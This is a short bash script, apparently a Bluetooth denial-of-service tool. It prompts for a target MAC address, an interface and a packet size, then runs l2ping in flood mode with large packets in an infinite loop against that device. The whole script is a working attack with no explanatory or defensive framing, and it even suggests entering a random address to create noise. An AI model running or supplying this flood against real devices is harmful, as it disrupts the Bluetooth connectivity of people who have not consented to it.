#!/bin/bash
printf "MAC address: (if not known, type a random one, it will create some noise) "
read addr
hciconfig
printf "Interface: "
read interf
printf "Packet size: (600?) "
read size
while :
do
	l2ping -i "$interf" -s "$size" -f "$addr"
done
